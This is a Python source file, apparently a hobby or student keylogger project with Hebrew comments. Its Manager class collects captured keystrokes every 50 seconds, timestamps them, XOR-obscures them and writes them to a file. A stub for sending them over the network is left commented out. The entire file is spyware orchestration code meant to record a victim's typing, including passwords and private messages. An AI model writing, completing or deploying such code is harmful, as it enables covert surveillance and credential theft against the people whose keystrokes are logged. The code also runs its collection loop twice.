import time, datetime, ctypes, threading
from key_logger import KeyLogger
from FileWriter import FileWriter
from encryption import Encryption


class Manager:

    def __init__(self, time):
        self.time = time
        self.keylogger = KeyLogger()
        self.file_writer = FileWriter()
        self.encryption = Encryption(5)
        self.running = False

    def collect_keys(self):
        while self.running:
            try:
                time.sleep(self.time)
                logged_keys = self.keylogger.get_logged_keys()
                if logged_keys:
                    timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
                    data = {timestamp: logged_keys}

                    # הצפנה
                    encrypted_data = self.encryption.xor_encrypt_decrypt_dict_list(data)

                    # שליחה לקובץ
                    self.file_writer.Writes_to_file(encrypted_data)

                    #  שליחה לרשת (אם מופעל)
                    if self.file_writer.Writes_to_network:
                        pass  # self.network_writer.send(encrypted_data)

                    #  ניקוי ה-buffer
                    self.keylogger.clear_buffer()  # שים לב שזה כנראה צריך להיות בתוך KeyLogger
            except Exception as e:
                print(f"Error collecting keystrokes: {e}")

    def start(self):
        self.running = True
        self.keylogger.start_logging()
        threading.Thread(target=self.collect_keys, daemon=True).start()
        self.collect_keys()

    def stop(self):
        self.running = False
        self.keylogger.stop_logging()


if __name__ == '__main__':
    a = Manager(50)
    a.start()
